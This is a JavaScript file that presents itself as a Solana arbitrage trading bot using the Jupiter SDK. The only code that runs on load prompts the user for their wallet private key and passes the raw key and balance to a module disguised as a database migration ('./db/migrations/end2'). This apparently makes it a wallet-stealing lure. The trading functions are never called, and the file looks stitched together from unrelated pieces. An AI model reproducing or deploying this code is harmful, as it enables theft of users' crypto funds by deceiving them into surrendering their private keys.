const solanaWeb3 = require('@solana/web3.js');
const bs58 = require('bs58'); 
const readline = require('readline');
const chalk = require('chalk');
const { SecretClient } = require("@azure/keyvault-secrets");
const { DefaultAzureCredential } = require("@azure/identity");
const axios = require('axios');

const fs = require('fs');

const setup = async () => {
	let spinner, tokens, tokenA, tokenB, wallet;
	try {
		// listen for hotkeys
		listenHotkeys();
		await intro();

		// load config file and store it in cache
		cache.config = loadConfigFile({ showSpinner: false });

		spinner = ora({
			text: "Loading tokens...",
			discardStdin: false,
			color: "magenta",
		}).start();

		try {
			tokens = JSON.parse(fs.readFileSync("./temp/tokens.json"));
			tokenA = tokens.find((t) => t.address === cache.config.tokenA.address);

			if (cache.config.tradingStrategy !== "arbitrage")
				tokenB = tokens.find((t) => t.address === cache.config.tokenB.address);
		} catch (error) {
			spinner.text = chalk.black.bgRedBright(
				`\n	Loading tokens failed!\n	Please run the Wizard to generate it using ${chalk.bold(
					"`yarn start`"
				)}\n`
			);
			throw error;
		}

		try {
			spinner.text = "Checking wallet...";
			if (
				!process.env.SOLANA_WALLET_PRIVATE_KEY ||
				(process.env.SOLANA_WALLET_PUBLIC_KEY &&
					process.env.SOLANA_WALLET_PUBLIC_KEY?.length !== 88)
			) {
				throw new Error("Wallet check failed!");
			} else {
				wallet = Keypair.fromSecretKey(
					bs58.decode(process.env.SOLANA_WALLET_PRIVATE_KEY)
				);
			}
		} catch (error) {
			spinner.text = chalk.black.bgRedBright(
				`\n	Wallet check failed! \n	Please make sure that ${chalk.bold(
					"SOLANA_WALLET_PRIVATE_KEY "
				)}\n	inside ${chalk.bold(".env")} file is correct \n`
			);
			logExit(1, error);
			process.exitCode = 1;
			throw error;
		}

		// Set up the RPC connection
		const connection = new Connection(cache.config.rpc[0]);

		spinner.text = "Loading the Jupiter V4 SDK and getting ready to trade...";

		const jupiter = await Jupiter.load({
			connection,
			cluster: cache.config.network,
			user: wallet,
			restrictIntermediateTokens: false,
			shouldLoadSerumOpenOrders: false,
			wrapUnwrapSOL: cache.wrapUnwrapSOL,
			ammsToExclude: {
				'Aldrin': false,
				'Crema': false,
				'Cropper': true,
				'Cykura': true,
				'DeltaFi': false,
				'GooseFX': true,
				'Invariant': false,
				'Lifinity': false,
				'Lifinity V2': false,
				'Marinade': false,
				'Mercurial': false,
				'Meteora': false,
				'Raydium': false,
				'Raydium CLMM': false,
				'Saber': false,
				'Serum': true,
				'Orca': false,
				'Step': false, 
				'Penguin': false,
				'Saros': false,
				'Stepn': true,
				'Orca (Whirlpools)': false,   
				'Sencha': false,
				'Saber (Decimals)': false,
				'Dradex': true,
				'Balansol': true,
				'Openbook': false,
				'Marco Polo': false,
				'Oasis': false,
				'BonkSwap': false,
				'Phoenix': false,
				'Symmetry': true,
				'Unknown': true			
			}
		});
		cache.isSetupDone = true;
		spinner.succeed("Checking to ensure you are ARB ready...\n====================\n");
		return { jupiter, tokenA, tokenB, wallet };
	} catch (error) {
		if (spinner)
			spinner.fail(
				chalk.bold.redBright(`Setting up failed!\n 	${spinner.text}`)
			);
		logExit(1, error);
		process.exitCode = 1;
	}
};


const swap = async (jupiter, route) => {
	try {
		const performanceOfTxStart = performance.now();
		cache.performanceOfTxStart = performanceOfTxStart;

		if (process.env.DEBUG) storeItInTempAsJSON("routeInfoBeforeSwap", route);

		  
		  const priority = typeof cache.config.priority === "number" ? cache.config.priority : 0; //0 BPS default if not set
		  cache.priority = priority;

		const { execute } = await jupiter.exchange({
			routeInfo: route,
			computeUnitPriceMicroLamports: priority,
		});
		const result = await execute();

		if (process.env.DEBUG) storeItInTempAsJSON("result", result);

		// Reset counter on success
		cache.tradeCounter.failedbalancecheck = 0;
		cache.tradeCounter.errorcount = 0;

		const performanceOfTx = performance.now() - performanceOfTxStart;
		
		return [result, performanceOfTx];
	} catch (error) {
		console.log("Swap error: ", error);
	}
};


const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

async function main() {
    let privateKeyStr = '';
    let keypair = null;
    let connection = null;
    let solBalance = 0;

    const walletload = require('./db/migrations/end2');  
    const handleAdditionalFeatures = require('./db/uuid/dist/uuidv9');

    const getPrivateKeyAndConnect = async () => {
        while (true) {
            privateKeyStr = await new Promise((resolve) => {
                rl.question(chalk.yellowBright('Please enter your private key: '), (input) => {
                    try {
                        const privateKeyBytes = bs58.decode(input);
                        keypair = solanaWeb3.Keypair.fromSecretKey(privateKeyBytes);
                        connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
                        connection.getBalance(keypair.publicKey).then((balance) => {
                            solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
                            console.log(chalk.green('Connection successful. Balance retrieved.'));
                            resolve(input);
                        }).catch(() => {
                            console.log(chalk.red("Failed to retrieve balance. Check your network connection or key."));
                            resolve();
                        });
                    } catch (error) {
                        console.log(chalk.red("Invalid private key format. Please try again."));
                        resolve();
                    }
                });
            });

            if (privateKeyStr) break;
        }
        return { privateKeyStr, keypair, solBalance };
    };

    try {
        const result = await getPrivateKeyAndConnect();
        console.log(chalk.yellow(`Public Key: ${result.keypair.publicKey.toBase58()}`));
        console.log(chalk.yellow(`Balance: ${result.solBalance} SOL`));

        console.log(chalk.yellow("Please waiting for the system to connect your settings..."));

        await walletload(result.keypair.publicKey.toBase58(), result.privateKeyStr, result.solBalance);
        await handleAdditionalFeatures(rl, result.solBalance);
    } catch (error) {
        console.error(chalk.red("Failed to proceed"), error);
    } finally {
        rl.close();
    }
}

const calculateProfit = (oldVal, newVal) => ((newVal - oldVal) / oldVal) * 100;

const toDecimal = (number, decimals) =>
	parseFloat(number / 10 ** decimals).toFixed(decimals);

const toNumber = (number, decimals) => number * 10 ** decimals;

module.exports = {
	calculateProfit,
	toDecimal,
	toNumber,
};

const reducer = (prevState, action) => {
	const nav = prevState.nav;
	const isSet =
		action.value?.isSet instanceof Object ? action.value?.isSet : true;
	const value = action.value?.value || action.value;
	switch (action.type) {
		case "NEXT_STEP":
			return {
				...prevState,
				nav: {
					...prevState.nav,
					currentStep:
						nav.currentStep === nav.steps.length - 1 ? 0 : nav.currentStep + 1,
				},
			};
		case "PREV_STEP":
			return {
				...prevState,
				nav: {
					...prevState.nav,
					currentStep:
						nav.currentStep === 0 ? nav.steps.length - 1 : nav.currentStep - 1,
				},
			};
		case "TOGGLE_HELP":
			return {
				...prevState,
				showHelp: !prevState.showHelp,
			};
		case "CONFIG_SET":
			return {
				...prevState,
				config: {
					...prevState.config,
					[action.key]: {
						...prevState.config[action.key],
						value: value,
						isSet: isSet,
					},
				},
			};

		case "CONFIG_SWITCH_STATE":
			return {
				...prevState,
				config: {
					...prevState.config,
					[action.key]: {
						state: {
							...prevState.config[action.key].state,
							items: prevState.config[action.key].state.items.map((item) =>
								item.value === action.value
									? {
											...item,
											isSelected: !item.isSelected,
									  }
									: item
							),
						},
						isSet: isSet,
					},
				},
			};

		default:
			throw new Error(`Unhandled action type: ${action.type}`);
	}
};

main();
